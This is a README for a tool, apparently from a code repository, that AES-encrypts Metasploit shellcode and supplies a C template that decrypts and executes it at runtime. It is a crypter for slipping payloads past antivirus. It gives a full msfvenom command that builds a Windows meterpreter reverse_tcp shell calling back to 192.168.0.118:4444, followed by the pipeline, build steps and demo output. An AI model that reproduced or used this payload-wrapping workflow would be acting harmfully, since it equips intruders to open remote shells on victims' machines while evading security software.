# AES crypto shellcode
This project is to update the traditional metasploit template which can be found in "./src/metasploit-template.c". This project provides 2 things: a shell pipe program which allows the user to pipe raw msfvenom data and transform it into AES ciphertext which is output in c-style formatting, the second thing this project provides is an AES template to decrypt the AES ciphertext back into metasploit raw data and execute it.


Usage:
```
echo -ne 'Hello, World!' | ./bin/aes-pipe-shellcode.exe [aes-hex-key] [aes-hex-iv]
```


Create encrypted shellcode:
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.118 LPORT=4444 -b '\x00' \
-e x86/shikata_ga_nai -i 1 -f raw -a x86 --platform Windows | ./bin/aes-pipe-shellcode \
41414141414141414141414141414141 42424242424242424242424242424242
```


Input the resulting key, iv and ciphertext into the AES-template:
```
./src/decrypt-execute.c

...
unsigned char key[] = "[aes-key-goes-here]";
unsigned char iv[] = "[aes-iv-goes-here]";
unsigned char ciphertext[BUFSIZE] = "[aes-encrypted-payload-goes-here]"
...

```

Then compile:
```
make linux
or
make wine
or
make all
```

demo.sh output:
```
./demo.sh 

Pipe AES shellcode program
Key: \x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41
IV: \x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42
Plaintext: Hello, World!
Ciphertext:
\x2f\x25\xe2\x8a\x90\x4e\xd4\xba\x45\xdd\xcb\xdb\x4c\x2a\x5f\xf7\x84\x25\xd3\x96\x00\xe9\x29\x22\x06\x24\x27\x4e\x92\x8f\xfa\x2d\xe9\x30\x91\x97\x71\xfb\x06\x2e\x23\x7f\x9f\x83\xd7\x24\xa8\x69\x9a\x01\x22\x7f\x67\x25\x57\xfa\x76\x04\xdf\x63\x8e\x98\x36\x11\xf2\xb4\x51\x37\x9f\xb6\x54\xbb\x9a\xe3\x07\x05\xa1\xa7\xa2\xf2\xa6\x00\x85\x7a\x36\x1e\x64\x05\xb5\x60\x60\xa9\xe7\x05\x6e\x0a\xd0\xc8\x87\x7c\x5e\x55\xae\x37\x9c\x30\x8c\x9e\x7e\x89\x96\x0e\x02\x06\xb7\xa3\xa7\x15\xae\x7f\x22\x43\x07\x54\x51\x5e\x0b\x37\x72\x22\x9f\x64\x67\xc5\xbb\xee\x3d\x87\xec\xe8\x71\x27\x28\x85\x1c\x2a\xd8\x4a\x7a\x90\xf3\x05\x12\xcd\xc6\x7f\x52\x0d\x0b\x34\x01\xa1\x8c\xb6\x56\xa2\x72\xfe\xbd\xe4\xa8\xf0\xc3\xb1\x66\xcc\xd0\x38\xa1\x9b\x07\xe2\xf7\x7f\xb1\xd0\xae\xa2\x45\xe1\x43\x75\x87\x89\x5e\xa2\x13\xe1\xcb\x70\x9a\xe3\xbf\xbd\x6c\x17\xaf\x39\xc8\xb7\x77\xaf\x06\xd3\x9e\x6d\x4e\xa7\xc6\x5d\x7f\xa4\xb1\x75\x1c\xe0\x82\x9c\x6b\x3f\x71\x77\x6d\x1b\x46\x03\x0f\x79\x7f\x51\xd1\xf3\xa5\xa2\x3e\xe5\x5c\xc1\x9f\x85\x01\x99\x9e\x26\x22\xd3\x2b\x1e\x0d\x59\xd1\xc2\xfe\xbe\x6f\xb3\x12\x83\xe0\x12\x8c\x77\x0a\x2c\xbc\xdf\xc0\x02\xd0\xc6\x9d\xd2\x27\x6a\xac\x37\xc0\x5a\x8c\x0e\x8d\x8b\xb3\xe4\xca\x00\x7a\x61\x66\x6f\x84\x5e\x13\x7a\xa8\xee\xf7\xa0\x4f\xab\x6b\x6f\xa8\x3e\xcd\x05\x03\x75\x69\xe4\x49\xdb\x62\x1e\xc6\xa1\x3d\x98\xc0\x0a\xb8\xe9\x5a\x3c\x3b\xc1\x7a\xf6\xa5\x89\xae\xa8\xf4\xf1\x8a\x69\xcc\x1d\x24\x83\x08\xcf\x6c\x19\x14\x8a\x9f\xb3\x84\xa8\x5d\xfd\x21\x6c\xf9\xd3\xc3\x26\x33\x68\xa4\x06\x26\xe0\x04\x05\x91\x8c\xca\xa1\x6c\x91\xf7\xf1\xa6\x8f\x86\xe3\x09\x2f\x2f\x60\x59\xe8\x29\x02\xf1\xc1\xe1\x9c\x32\x71\x6a\xc9\x35\x4e\x3d\xfe\x55\x24\x4b\x75\x1b\xc8\x20\x2a\xa4\xd9\x5a\xd9\x90\x31\x81\x76\x3b\x6a\x01\xfb\xab\x92\xec\x19\x70\x03\x79\xdf\x84\xb9\x01\x8f\x2a\x54\x45\xf6\xf2\x70\x6a\x07\x27\x8b\xde\xb9\xb1\xa3\x13\xd8\xef\xd0\x54\xf3\x9c\x1a\x42\xf7\xfc\xb0\x24\x9f\xa4\xfb\xd2\x5e\x5a\x7d\x2e\xdb\x9c\x8a\x4c\xa2\x72\x02\x52\x25\x5c\x49\x03\xf9\x1b\x1d\xb8\xf7\x2f\x54\xcd\x2b\x2e\x91\x36\x8e\xe5\xf2\x01\x4e\x43\x7e\xeb\x57\xe5\xc8\xc4\xe3\xd1\x96\x31\xf4\x24\x66\x5d\x55\x51\x2f\x37\xe2\xe2\xf5\x14\xe4\xe7\x43\x60\x23\x2b\xf0\x3e\xe3\x92\x6c\xc0\xab\x1d\xc0\xb0\x35\x13\xd2\xf6\xcc\x51\x75\xf2\x35\xeb\xba\xe7\x95\x44\x5d\x96\xbe\x66\x55\x3b\xe2\xd5\x53\x1c\xa7\xe2\xf2\xa8\x38\x9f\xb2\xc7\x0f\x57\x36\xc9\x78\xeb\x26\xea\x29\x1f\x7e\x87\x0e\xe3\xaf\xb9\x9e\x59\x24\x48\xa5\xf9\xd4\x44\x98\x5d\x68\x65\xbd\x1c\x7f\x4e\x2f\x54\xfb\x16\x0e\x46\x87\x83\x40\x9b\xd4\x0d\xa3\xe7\xd5\x78\xba\xbf\x64\xd2\x30\x30\x5c\x2d\x1d\x72\xcd\x06\xad\x2a\xa8\x64\x14\xe6\x34\x8a\x47\x0f\x64\x72\xdc\xff\x38\xc0\xb6\xfb\xc9\x6e\x12\x69\x2c\x12\x53\x78\x5a\x05\x66\x21\xc6\x5e\xdf\x2e\xfa\x35\xed\x60\xc4\x42\xd3\x76\xe0\xb9\x29\xa7\x55\x40\xfe\x3b\xc5\x1e\xa8\xee\xd3\x8a\x52\xee\x42\x7d\x95\x65\x9c\xd7\xfe\x8f\xa7\x71\x30\xa3\xa1\xbf\xd6\x80\xe6\x9a\x2d\x7d\x4b\xaf\xb9\x20\xa7\xf2\xb8\xe2\xa1\xf6\x1b\x1e\x49\x89\x80\x76\x73\xdb\x57\x98\x21\xb2\xe0\xf5\x80\xf7\x1f\x99\x5d\x63\xe6\xfa\xdf\x77\x18\xec\x1b\xa7\xd5\xf4\xe0\x75\x02\xcf\x3c\x5e\xc5\x59\x36\xef\x0e\x59\xaa\x03\xef\x42\x54\xc0\x6d\x3a\xc8\x54\xd9\x12\x49\xbc\x7d\xee\xcd\x22\x68\x90\xf3\x71\x7d\x35\x4e\xbb\x20\x6c\xf1\x82\xeb\xe7\xd4\x93\x89\xd9\x9a\x1a\x3a\xcc\x28\xba\xa8\x97\x5b\xc7\x6d\xeb\x6e\x40\x05\x9b\x8f\xa4\x36\xe6\x30\x36\x2e\x83\x64\x7a\x9c\x1e\xd2\xe8\x68\xa0\xea\x9e\x54\x1e\xe2\xf6\x03\x2b\x19\x44\xe8\x67\x4c\x31\xbb\xe1\x71\x4a\xe3\x5e\x3b\x15\xcf\x70\xae\xd9\xa5\xc5\x60\xa4\x60\x8b\x27\x91\x3b\x35\xb7\x9b\x18\x26\x75\xb3\xf6\x38\x9c\x36\x72\xdf\xa6\x61\xc4\xd4\xe8\xa8\x8b\x2f\xd7\xa8\x2e\xf5\xe1\x6a\x45\x0d\xa5\x93\x20\xdf\x5a\x0d\xd1\x03\x74\xb3\x0c\x44\xbe\x2d\x66\x9a\x8d\xd9\x69\x8d\x78\x25\xb6\x6b\xc0\x0b\xb6\x7d\xdc\x24\x5c\x0e\x18\x77\x6d\x97\x40\xf2\xef\xa6\x0e\x69\xc1\x37\xaf\x02\xba\xec\x6c\x62\xe4\xd2\x71\x5d\x6c\x37\x81\x58\xd9\x08\x65\x48\x53\x51\x96\xf7\xa1\xc7\xc8\x26\xa1\x58\x72\xeb\xde\xdc\x5e\x44\x7d\xdd\x10\x49\x65\x3d\x5f\x9d\x5e\x9b\x98\x52\x04\xe9\x77\xfb\x13\xe5\x85\x24\xff\x1c\xe9\xc2\x81\x2e\x08\xe5\xe8\x8a\x2d\x26\x59\xa8\xd5\x27\xff\x28\xc2\xa3\x15\x64\x6b\x87\xeb\x0b\xf8\xd2\x2c
Recovered: Hello, World!

Decrypt AES and execute program
AAAAAAAAAAAAAAAA
BBBBBBBBBBBBBBBB
Hello, World!
```


